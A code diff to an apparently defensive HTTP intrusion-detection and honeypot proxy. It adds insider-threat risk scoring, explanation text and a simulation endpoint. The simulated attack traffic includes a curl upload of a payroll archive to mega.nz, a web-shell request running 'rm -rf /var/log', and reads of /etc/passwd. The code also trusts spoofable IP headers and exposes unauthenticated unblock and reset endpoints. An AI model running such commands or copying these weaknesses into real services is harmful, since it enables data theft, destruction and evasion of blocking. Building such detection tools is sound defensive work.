@@ -12,17 +12,35 @@ from agents.decision import build_hybrid_classifier, classify_http_request
 from agents.deception import DecoyManager
 from interceptor.nftables_manager import NftablesManager
 from interceptor.session_store import SessionStore
+from agents.insider.insider_adapter import AdaptiveInsiderDetector
+from agents.xai import AdaptiveXAINarrator
+import ipaddress
+from datetime import datetime
+import asyncio
+from fastapi.responses import StreamingResponse
 from honeypot import HoneypotGenerator
+
+# Global event queue will be attached to app.state inside create_http_guard_app
+active_event_queue = None
+
+
+def _is_private_ip(ip: str) -> bool:
+    try:
+        address = ipaddress.ip_address(ip.strip())
+        return address.is_private or address.is_loopback
+    except ValueError:
+        return False
 
 
 def _request_to_context(request: Request, body: str) -> Dict:
+    source_ip = request.headers.get("x-mock-ip") or request.headers.get("x-forwarded-for") or (request.client.host if request.client else "unknown")
     return {
         "method": request.method,
         "path": request.url.path,
         "query": str(request.url.query or ""),
         "body": body,
         "headers": dict(request.headers),
-        "source_ip": request.client.host if request.client else "unknown",
+        "source_ip": source_ip,
     }
 
 
@@ -40,6 +58,7 @@ def create_http_guard_app(config: Dict) -> FastAPI:
     brute_force_threshold = int(http_cfg.get("brute_force_threshold", 8))
     block_duration_minutes = int(http_cfg.get("block_duration_minutes", 60))
     fallback_on_error = bool(http_cfg.get("fallback_on_error", True))
+    listen_port = int(http_cfg.get("listen_port", 80))
     session_idle_timeout_sec = int(http_cfg.get("session_idle_timeout_sec", 900))
 
     os.makedirs(os.path.dirname(threat_log_path), exist_ok=True)
@@ -49,6 +68,9 @@ def create_http_guard_app(config: Dict) -> FastAPI:
     nft.ensure_base_ruleset()
 
     classifier = build_hybrid_classifier()
+    insider_detector = AdaptiveInsiderDetector()
+    xai_detector = AdaptiveXAINarrator()
+
     decoys = DecoyManager(
         http_image=decoy_cfg.get("http_image", "adaptiveshield/http-decoy:latest"),
         max_instances=int(decoy_cfg.get("max_instances", 5)),
@@ -70,6 +92,9 @@ def create_http_guard_app(config: Dict) -> FastAPI:
     app.state.nft = nft
     app.state.classifier = classifier
     app.state.decoys = decoys
+    app.state.event_queue = asyncio.Queue()
+    global active_event_queue
+    active_event_queue = app.state.event_queue
     app.state.honeypot_gen = honeypot_gen
 
     async def forward_request(target_base_url: str, request: Request, body: bytes) -> Response:
@@ -104,6 +129,151 @@ def create_http_guard_app(config: Dict) -> FastAPI:
             "docker_available": decoys.docker_available,
             "real_service": f"http://{real_host}:{real_port}",
         }
+    @app.get("/api/events")
+    async def sse_events(request: Request):
+        async def event_generator():
+            while True:
+                if await request.is_disconnected():
+                    break
+                try:
+                    if active_event_queue is not None:
+                        event = await asyncio.wait_for(active_event_queue.get(), timeout=1.0)
+                        yield f"data: {json.dumps(event)}\n\n"
+                        active_event_queue.task_done()
+                    else:
+                        await asyncio.sleep(1.0)
+                except asyncio.TimeoutError:
+                    yield ": heartbeat\n\n"
+        return StreamingResponse(event_generator(), media_type="text/event-stream")
+
+    @app.get("/api/events/history")
+    async def get_event_history():
+        cur = store.conn.cursor()
+        cur.execute("SELECT details_json FROM request_events ORDER BY id DESC LIMIT 50")
+        rows = cur.fetchall()
+        past_events = []
+        for r in rows:
+            try:
+                past_events.append(json.loads(r[0]))
+            except Exception:
+                pass
+        return past_events[::-1]
+
+    @app.post("/api/simulate")
+    async def run_simulation(request: Request):
+        payload = await request.json()
+        scenario = payload.get("scenario")
+        role = payload.get("role", "developer")
+        user_id = payload.get("user_id", "dev_01")
+        
+        async with httpx.AsyncClient() as client:
+            base_url = f"http://127.0.0.1:{listen_port}"
+            
+            # Map specific users to distinct mock IPs to ensure clean session and risk isolation
+            ip_map = {
+                "dev_alice": "192.168.1.101",
+                "fin_charlie": "192.168.1.102",
+                "hr_bob": "192.168.1.103"
+            }
+            internal_ip = ip_map.get(user_id, "192.168.1.75")
+            
+            # Helper to run a single step in a scenario
+            async def send_sim_request(method: str, path: str, ip: str, headers_extra: dict = None, body_data: dict = None):
+                headers = {"x-mock-ip": ip}
+                if headers_extra:
+                    headers.update(headers_extra)
+                try:
+                    if method.upper() == "POST":
+                        await client.post(f"{base_url}{path}", headers=headers, json=body_data)
+                    else:
+                        await client.get(f"{base_url}{path}", headers=headers)
+                except Exception:
+                    pass
+                await asyncio.sleep(0.6)  # Small delay to allow SSE streaming to animate in order
+
+            if scenario == "normal_user":
+                await send_sim_request("GET", "/about", "84.22.12.19")
+                await send_sim_request("GET", "/contact", "84.22.12.19")
+                
+            elif scenario == "external_recon":
+                await send_sim_request("GET", "/.git/config", "198.51.100.42")
+                
+            elif scenario == "external_destructive":
+                await send_sim_request("GET", "/admin/shell?cmd=rm%20-rf%20/var/log", "203.0.113.111")
+                
+            elif scenario == "insider_normal":
+                headers = {"x-user-id": user_id, "x-user-role": role}
+                await send_sim_request("POST", "/workspace/run", internal_ip, headers, {"command": "git status"})
+                await send_sim_request("POST", "/workspace/run", internal_ip, headers, {"command": "git pull"})
+                await send_sim_request("POST", "/workspace/run", internal_ip, headers, {"command": "python main.py"})
+                
+            elif scenario == "insider_recon":
+                headers = {"x-user-id": user_id, "x-user-role": role}
+                await send_sim_request("POST", "/workspace/run", internal_ip, headers, {"command": "git status"})
+                await send_sim_request("POST", "/workspace/run", internal_ip, headers, {"command": "ls -la /etc/passwd"})
+                
+            elif scenario == "insider_sabotage":
+                headers = {"x-user-id": user_id, "x-user-role": role}
+                await send_sim_request("POST", "/workspace/run", internal_ip, headers, {"command": "cat /payroll/employees.csv"})
+                await send_sim_request("POST", "/workspace/run", internal_ip, headers, {"command": "tar -czf employees.tar.gz /payroll"})
+                await send_sim_request("POST", "/workspace/run", internal_ip, headers, {"command": "curl -F file=@employees.tar.gz mega.nz/upload"})
+                
+            elif scenario == "custom_command":
+                cmd = payload.get("command", "")
+                origin = payload.get("origin", "internal")
+                if origin == "external":
+                    import urllib.parse
+                    await send_sim_request("GET", f"/admin/shell?cmd={urllib.parse.quote(cmd)}", "84.22.12.19")
+                else:
+                    headers = {"x-user-id": user_id, "x-user-role": role}
+                    await send_sim_request("POST", "/workspace/run", internal_ip, headers, {"command": cmd})
+                    
+        return {"status": "simulation_fired"}
+
+    @app.post("/api/unblock")
+    async def release_blocked_ip(request: Request):
+        payload = await request.json()
+        ip = payload.get("ip")
+        if ip:
+            store.unblock_ip(ip)
+            nft.unblock_ip(ip)
+        return {"status": "unblocked", "ip": ip}
+
+    @app.post("/api/reset_session")
+    async def reset_session_risk(request: Request):
+        payload = await request.json()
+        session_id = payload.get("session_id")
+        if session_id:
+            # Unblock IP if it was blocked
+            cur = store.conn.cursor()
+            cur.execute("SELECT src_ip FROM sessions WHERE id = ?", (session_id,))
+            row = cur.fetchone()
+            if row:
+                ip = row[0]
+                store.unblock_ip(ip)
+                nft.unblock_ip(ip)
+            
+            # Clear database and in-memory states
+            store.reset_session(session_id)
+            insider_detector.reset_session_state(session_id)
+        return {"status": "success", "session_id": session_id}
+
+    @app.post("/api/reset_all")
+    async def reset_all_sessions(request: Request):
+        store.conn.execute("DELETE FROM request_events")
+        store.conn.execute("DELETE FROM sessions")
+        store.conn.commit()
+        insider_detector.session_states.clear()
+        return {"status": "success", "message": "All sessions and blocks cleared successfully."}
+
+    from fastapi.responses import HTMLResponse
+    @app.get("/dashboard", response_class=HTMLResponse)
+    async def get_dashboard():
+        template_path = os.path.join(os.path.dirname(__file__), "..", "orchestrator", "templates", "dashboard.html")
+        if os.path.exists(template_path):
+            with open(template_path, "r", encoding="utf-8") as f:
+                return f.read()
+        return "Dashboard template not found."
 
     @app.api_route("/{path:path}", methods=["GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS", "HEAD"])
     async def guard(path: str, request: Request):
@@ -115,6 +285,70 @@ def create_http_guard_app(config: Dict) -> FastAPI:
 
         blocked_until = store.get_blocked_until(src_ip)
         if blocked_until and blocked_until > time.time():
+            # Log blocked attempt event to the dashboard
+            session_id = store.get_or_create_session(src_ip, idle_timeout_sec=session_idle_timeout_sec)
+            
+            event = {
+                "timestamp": time.time(),
+                "session_id": session_id,
+                "source_ip": src_ip,
+                "method": request.method,
+                "path": request.url.path,
+                "query": str(request.url.query or ""),
+                "label": "Destructive",
+                "action": "drop_and_block",
+                "target": "blocked",
+                "rule": "IP is banned in kernel firewall",
+                "mitre_tactics": ["defense_evasion"],
+                "severity_max": 10,
+                "response_status": 403,
+                "is_insider": _is_private_ip(src_ip),
+                "login_attempts": store.get_counter(session_id, "login_attempts"),
+            }
+            
+            # Generate XAI Explanation
+            from interfaces.xai_contract import ClassificationEvent, RoutingDecision
+            xai_features = {
+                "already_blocked": True,
+                "risk_score": 100.0,
+                "role": request.headers.get("x-user-role", "attacker")
+            }
+            xai_event = ClassificationEvent(
+                session_id=session_id,
+                timestamp=datetime.now().isoformat() + "Z",
+                src_ip=src_ip,
+                commands=[body_str] if body_str else [],
+                classification="Destructive",
+                confidence=1.0,
+                mitre_techniques=["T1000"],
+                features_used=xai_features
+            )
+            xai_decision = RoutingDecision(
+                session_id=session_id,
+                action="drop_and_block",
+                target="blocked",
+                reason="IP is already blocked in firewall"
+            )
+            explanation = xai_detector.generate_explanation(xai_event, xai_decision)
+            
+            event["xai_summary"] = explanation.summary
+            event["xai_detailed"] = explanation.detailed
+            event["xai_risk_score"] = explanation.risk_score
+            event["xai_recommendations"] = explanation.recommended_actions
+            
+            try:
+                if active_event_queue is not None:
+                    await active_event_queue.put(event)
+            except Exception:
+                pass
+            
+            store.write_event(session_id, event)
+            try:
+                with open(threat_log_path, "a", encoding="utf-8") as f:
+                    f.write(json.dumps(event) + "\n")
+            except Exception:
+                pass
+            
             return JSONResponse(
                 status_code=403,
                 content={"error": "blocked", "reason": "temporary_block", "blocked_until": blocked_until},
@@ -148,7 +382,84 @@ def create_http_guard_app(config: Dict) -> FastAPI:
                     "http_findings": ["brute_force"],
                 }
 
-        action = decision["action"]
+        # Determine base risk score from external neural network classification
+        confidence = decision.get("neural_confidence", 1.0)
+        ext_label = decision["label"].lower()
+        if decision.get("action") == "drop_and_block":
+            base_risk_score = 100.0
+        elif ext_label == "safe":
+            base_risk_score = confidence * 10.0
+        elif ext_label == "recon":
+            base_risk_score = 30.0 + (confidence * 20.0)
+        elif ext_label in ("downloader", "exploit"):
+            base_risk_score = 50.0 + (confidence * 25.0)
+        else: # Destructive, APT
+            base_risk_score = 75.0 + (confidence * 25.0)
+
+        # Check for Insider Threat if source IP is internal/private
+        is_internal = _is_private_ip(src_ip)
+        risk_score = base_risk_score
+        insider_threat = None
+        
+        if is_internal:
+            from interfaces.insider_contract import UserBehaviorSignal
+            
+            # Extract simulated features from HTTP JSON body if available
+            extra_details = {}
+            if body_str:
+                try:
+                    body_json = json.loads(body_str)
+                    if isinstance(body_json, dict):
+                        extra_details = body_json
+                except Exception:
+                    pass
+            
+            action_details = {
+                "command": extra_details.get("command", decision.get("extracted_command", "")),
+                "file_path": request.url.path,
+                "role": request.headers.get("x-user-role", "normal"),
+                **extra_details
+            }
+            
+            # Dynamic failed_sudo check: if command starts with sudo and user is not admin, mark it failed
+            cmd_val = action_details.get("command", "")
+            role_val = action_details.get("role", "normal").lower()
+            if cmd_val and cmd_val.strip().lower().startswith("sudo"):
+                if "admin" not in role_val:
+                    action_details["sudo_failed"] = True
+            
+            signal = UserBehaviorSignal(
+                user_id=request.headers.get("x-user-id", "unknown_user"),
+                session_id=session_id,
+                timestamp=datetime.now().isoformat() + "Z",
+                action_type=request.method,
+                action_details=action_details,
+                source_ip=src_ip,
+                is_internal=True
+            )
+            insider_threat = insider_detector.analyze_signal(signal)
+            # Combine external and internal threat risk scores
+            risk_score = max(insider_threat.risk_score, base_risk_score)
+
+        # Policy Engine Decides
+        if risk_score <= 30.0:
+            policy_decision = "NORMAL"
+            action = "forward"
+        elif risk_score <= 60.0:
+            policy_decision = "MONITOR"
+            action = "forward"
+            decision["rule"] = decision.get("rule") or "Policy: Monitor active session"
+        elif risk_score <= 80.0:
+            policy_decision = "ALERT"
+            action = "redirect_to_decoy"
+            decision["rule"] = decision.get("rule") or "Policy: High risk behavior, rerouted to decoy"
+        else:
+            policy_decision = "CONTAIN"
+            action = "drop_and_block"
+            decision["rule"] = decision.get("rule") or f"Policy: Containment triggered. Risk level: {risk_score}%"
+            decision["label"] = "Destructive"
+
+        decision["action"] = action
         target = f"http://{real_host}:{real_port}"
         result = None
 
@@ -260,6 +571,7 @@ def create_http_guard_app(config: Dict) -> FastAPI:
             "severity_max": decision.get("severity_max", 0),
             "response_status": result.status_code if result else 500,
             "login_attempts": store.get_counter(session_id, "login_attempts"),
+            "is_insider": is_internal,
         }
 
         # Include neural model metadata when available
@@ -271,6 +583,58 @@ def create_http_guard_app(config: Dict) -> FastAPI:
         if decision["label"] != "Safe" and brute_force_threshold > 0:
             if decision["label"] in ("Recon", "Downloader", "Exploit", "Destructive", "ADVANCED_APT"):
                 event["suspicious"] = True
+
+        # Generate XAI Explanation
+        from interfaces.xai_contract import ClassificationEvent, RoutingDecision
+        is_insider_active = is_internal and insider_threat is not None
+        
+        event["risk_score"] = risk_score
+        event["policy_decision"] = policy_decision
+        if is_insider_active:
+            event["evidence_features"] = {k: v for k, v in insider_threat.features.items() if v > 0} if insider_threat.features else {}
+
+        xai_features = {
+            "risk_score": risk_score,
+            "policy_decision": policy_decision
+        }
+        if is_insider_active:
+            xai_features.update({
+                "insider_threat": True if action == "drop_and_block" else False,
+                "role": request.headers.get("x-user-role", "normal"),
+                "anomaly_factors": insider_threat.anomaly_factors,
+                "evidence_features": insider_threat.features
+            })
+
+        xai_event = ClassificationEvent(
+            session_id=session_id,
+            timestamp=datetime.now().isoformat() + "Z",
+            src_ip=src_ip,
+            commands=[decision.get("extracted_command", "")] if decision.get("extracted_command") else [],
+            classification=decision["label"],
+            confidence=decision.get("neural_confidence", 1.0),
+            mitre_techniques=decision.get("mitre_tactics", []),
+            features_used=xai_features
+        )
+        xai_decision = RoutingDecision(
+            session_id=session_id,
+            action=action,
+            target=target,
+            reason=decision.get("rule", "Classification triggered")
+        )
+        
+        explanation = xai_detector.generate_explanation(xai_event, xai_decision)
+        
+        event["xai_summary"] = explanation.summary
+        event["xai_detailed"] = explanation.detailed
+        event["xai_risk_score"] = explanation.risk_score
+        event["xai_recommendations"] = explanation.recommended_actions
+
+        # Push to live dashboard stream queue
+        try:
+            if active_event_queue is not None:
+                await active_event_queue.put(event)
+        except Exception:
+            pass
 
         store.write_event(session_id, event)
         with open(threat_log_path, "a", encoding="utf-8") as f:
